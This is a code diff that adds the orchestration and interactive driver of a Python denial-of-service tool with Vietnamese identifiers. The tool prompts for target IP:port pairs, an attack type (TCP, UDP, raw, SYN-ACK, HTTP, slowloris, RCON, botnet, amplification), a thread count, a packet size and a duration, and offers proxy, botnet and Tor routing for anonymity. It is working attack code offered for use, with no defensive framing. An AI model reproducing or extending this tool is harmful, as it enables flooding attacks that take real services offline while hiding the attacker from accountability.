@@ -560,4 +560,88 @@ class DieuPhoiTanCong:
             logger.error("Danh sách máy chủ rỗng!")
             return
         for ip, cong in self.cau_hinh.danh_sach_may_chu:
-            if self.cau_h
+            if self.cau_hinh.loai_tan_cong in ['raw', 'syn_ack', 'amplification']:
+                with ThreadPoolExecutor() as executor:
+                    if self.cau_hinh.loai_tan_cong == 'raw':
+                        executor.submit(TanCongRaw(self.cau_hinh).thuc_hien, ip, cong)
+                    elif self.cau_hinh.loai_tan_cong == 'syn_ack':
+                        executor.submit(TanCongSYNAck(self.cau_hinh).thuc_hien, ip, cong)
+                    else:
+                        nhiem_vu.append(TanCongAmplification(self.cau_hinh).thuc_hien(ip, cong))
+            else:
+                loai_tan_cong = self.cac_loai_tan_cong.get(self.cau_hinh.loai_tan_cong)
+                if not loai_tan_cong:
+                    logger.error(f"Loại tấn công không hợp lệ: {self.cau_hinh.loai_tan_cong}")
+                    return
+                tan_cong = loai_tan_cong(self.cau_hinh, self.tai_nguyen)
+                nhiem_vu.extend([tan_cong.thuc_hien(i + 1, ip, cong) for i in range(self.cau_hinh.so_luong_luong)])
+        await asyncio.gather(*nhiem_vu, return_exceptions=True)
+        logger.info(f"Tấn công hoàn tất vào {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+
+# Hàm chính
+async def main():
+    try:
+        danh_sach_may_chu = []
+        while True:
+            dia_chi = input("Nhập địa chỉ máy chủ (IP:Cổng, để trống để kết thúc): ").strip()
+            if not dia_chi:
+                break
+            try:
+                ip, cong = dia_chi.split(':')
+                cong = int(cong)
+                if not (0 <= cong <= 65535):
+                    raise ValueError("Cổng phải từ 0 đến 65535!")
+                danh_sach_may_chu.append((ip, cong))
+            except ValueError as e:
+                logger.error(f"Lỗi định dạng địa chỉ: {e}, thử lại!")
+                continue
+        if not danh_sach_may_chu:
+            raise ValueError("Cần ít nhất một máy chủ mục tiêu!")
+
+        loai_tan_cong = input("Chọn loại tấn công (tcp/udp/raw/http/slowloris/rcon/botnet/amplification): ").lower()
+        if loai_tan_cong not in ['tcp', 'udp', 'raw', 'http', 'slowloris', 'rcon', 'botnet', 'amplification']:
+            raise ValueError("Loại tấn công không hợp lệ!")
+
+        so_luong_luong = int(input("Nhập số lượng luồng: "))
+        if so_luong_luong <= 0:
+            raise ValueError("Số luồng phải lớn hơn 0!")
+        
+        kich_thuoc_goi = int(input("Nhập kích thước gói tin (bytes, cho UDP): "))
+        if kich_thuoc_goi <= 0:
+            raise ValueError("Kích thước gói tin phải lớn hơn 0!")
+        
+        thoi_gian_tan_cong = int(input("Nhập thời gian tấn công (giây): "))
+        if thoi_gian_tan_cong <= 0:
+            raise ValueError("Thời gian tấn công phải lớn hơn 0!")
+        
+        su_dung_proxy = input("Sử dụng proxy? (y/n): ").lower() == 'y'
+        su_dung_botnet = input("Sử dụng botnet? (y/n): ").lower() == 'y'
+        su_dung_tor = input("Sử dụng Tor? (y/n): ").lower() == 'y'
+        cong_rcon = int(input("Nhập cổng RCON (mặc định 0 để bỏ qua): ") or 0)
+        if cong_rcon and (cong_rcon < 0 or cong_rcon > 65535):
+            raise ValueError("Cổng RCON phải từ 0 đến 65535!")
+
+        cau_hinh = CauHinhTanCong(
+            danh_sach_may_chu=danh_sach_may_chu,
+            cong_rcon=cong_rcon,
+            loai_tan_cong=loai_tan_cong,
+            so_luong_luong=so_luong_luong,
+            kich_thuoc_goi_tin=kich_thuoc_goi,
+            thoi_gian_tan_cong=thoi_gian_tan_cong,
+            su_dung_proxy=su_dung_proxy,
+            su_dung_botnet=su_dung_botnet,
+            su_dung_tor=su_dung_tor
+        )
+
+        dieu_phoi = DieuPhoiTanCong(cau_hinh)
+        await dieu_phoi.khoi_tao()
+        await dieu_phoi.chay()
+    except ValueError as e:
+        logger.error(f"Lỗi nhập liệu: {e}")
+    except Exception as e:
+        logger.error(f"Lỗi không mong đợi: {e}")
+    finally:
+        logger.info("Kết thúc chương trình.")
+
+if __name__ == "__main__":
+    asyncio.run(main())
